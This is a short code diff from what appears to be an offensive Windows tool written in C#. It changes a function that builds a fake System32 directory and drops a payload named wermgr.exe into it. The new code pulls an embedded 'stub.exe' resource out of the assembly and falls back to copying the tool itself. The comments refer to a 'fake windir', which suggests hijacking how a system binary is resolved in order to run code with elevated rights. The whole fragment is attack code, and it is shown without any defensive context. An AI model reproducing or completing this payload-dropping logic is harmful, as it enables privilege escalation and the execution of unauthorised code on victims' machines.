@@ -418,14 +418,27 @@ if($r-eq 0){
         } catch {}
     }
 
-    /* Prepare fake wermgr.exe path — just copy ourselves there */
+    /* Extract native stub from embedded resource and drop as fake wermgr.exe */
     static string PreparePayload(string runDir)
     {
-        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         string sys32 = Path.Combine(runDir, "System32");
         Directory.CreateDirectory(sys32);
         string dest = Path.Combine(sys32, "wermgr.exe");
+
+        /* Try embedded resource first */
+        var asm = Assembly.GetExecutingAssembly();
+        using (var s = asm.GetManifestResourceStream("stub.exe")) {
+            if (s != null) {
+                byte[] b = new byte[s.Length]; s.Read(b, 0, b.Length);
+                File.WriteAllBytes(dest, b);
+                Console.WriteLine($"[+] Dropped native stub -> {dest}");
+                return dest;
+            }
+        }
+        /* Fallback: copy self (will fail if .NET runtime can't load with fake windir) */
+        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         File.Copy(self, dest, true);
+        Console.WriteLine($"[+] Dropped self -> {dest} (warning: .NET may fail with fake windir)");
         return dest;
     }
 
